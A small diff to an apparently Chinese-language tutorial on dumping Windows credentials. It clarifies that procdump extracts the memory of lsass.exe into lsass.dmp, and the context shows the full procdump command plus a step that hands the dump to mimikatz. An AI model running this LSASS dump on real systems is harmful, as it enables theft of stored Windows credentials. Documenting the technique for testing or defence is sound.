@@ -12,7 +12,7 @@
 ```
 .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-提取进程lsass.exe到文件lsass.dmp中，如下图  
+提取进程lsass.exe的内存到文件lsass.dmp中，如下图  
 ![image](./pic/0.png)  
 将lsass.dmp拷贝到宿主机中64位的mimikatz目录下，执行命令
 ```
